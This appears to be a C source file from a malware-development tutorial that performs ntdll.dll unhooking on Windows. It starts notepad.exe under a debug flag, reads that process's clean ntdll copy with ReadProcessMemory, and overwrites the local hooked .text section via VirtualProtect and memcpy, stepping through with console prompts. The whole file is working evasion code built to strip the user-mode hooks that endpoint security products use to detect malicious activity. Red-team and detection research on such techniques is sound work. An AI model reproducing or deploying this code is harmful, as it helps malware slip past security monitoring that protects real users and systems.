#include <windows.h>
#include <stdio.h>
#include <winternl.h>

PVOID FetchLocalNtdllBaseAddress(
	_In_ VOID
) {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'DiskHooking.exe')
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
	
	return pLdr->DllBase;
}

// a function that return the size of the local ntdll.dll image
SIZE_T GetNtdllSizeFromBaseAddress(
	_In_ PBYTE pNtdllModule
) {

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;
	
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return pImgNtHdrs->OptionalHeader.SizeOfImage;
}

BOOL ReadNtdllFromASuspendedProcess(
	_In_ LPCSTR lpProcessName, 
	_Out_ PVOID* ppNtdllBuf
) {

	CHAR	cWinPath[MAX_PATH / 2]	= { 0 };
	CHAR	cProcessPath[MAX_PATH]	= { 0 };

	PVOID	pNtdllModule			= FetchLocalNtdllBaseAddress();
	PBYTE	pNtdllBuffer			= NULL;
	SIZE_T	sNtdllSize				= NULL,
			sNumberOfBytesRead		= NULL;

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// cleaning the structs (setting elements values to 0)
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// 'sprintf_s' is a more secure version than 'sprintf'
	sprintf_s(cProcessPath, sizeof(cProcessPath), "%s\\System32\\%s", cWinPath, lpProcessName);
	
	printf("[i] Running : \"%s\" As A Suspended Process... ", cProcessPath);
	if (!CreateProcessA(
		NULL,
		cProcessPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Substitute of CREATE_SUSPENDED		
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}
	printf("[+] DONE \n");
	printf("[i] Suspended Process Created With Pid : %d \n", Pi.dwProcessId);

	// allocating enough memory to read ntdll from the remote process
	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
	if (!sNtdllSize)
		goto _EndOfFunc;
	pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
	if (!pNtdllBuffer)
		goto _EndOfFunc;

	// reading ntdll.dll
	if (!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
		printf("[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
		printf("[i] Read %d of %d Bytes \n", sNumberOfBytesRead, sNtdllSize);
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

	printf("[#] Press <Enter> To Terminate The Child Process ... ");
	getchar();

	// terminating the process
	if (DebugActiveProcessStop(Pi.dwProcessId) && TerminateProcess(Pi.hProcess, 0)) {
		printf("[+] Process Terminated \n");
	}

	// if the 'CREATE_SUSPENDED' flag was used, 'DebugActiveProcessStop' is replaced with ResumeThread(Pi.hThread)

_EndOfFunc:
	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);
	if (Pi.hThread)
		CloseHandle(Pi.hThread);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;

}

BOOL ReplaceNtdllTxtSection(
	_In_ PVOID pUnhookedNtdll
) {

	PVOID				pLocalNtdll 	= (PVOID)FetchLocalNtdllBaseAddress(),
						pLocalNtdllTxt	= NULL,	// local hooked text section base address
						pRemoteNtdllTxt = NULL; // the unhooked text section base address
	SIZE_T				sNtdllTxtSize	= NULL;	// the size of the text section

	printf("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt	= (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}
	
	printf("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;

	printf("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	printf("[+] DONE !\n");

	return TRUE;
}

int main(
	_In_ VOID
) {

	PVOID	pNtdll = NULL;
	
	printf("[i] Fetching A New \"ntdll.dll\" File From A Suspended Process\n");

	if (!ReadNtdllFromASuspendedProcess("notepad.exe", &pNtdll))
		return -1;

	if (!ReplaceNtdllTxtSection(pNtdll))
		return -1;

	HeapFree(GetProcessHeap(), 0, pNtdll);
		
	printf("[+] Ntdll Unhooked Successfully \n");

	printf("[#] Press <Enter> To Quit ...");
	getchar();
	
	return 0;
}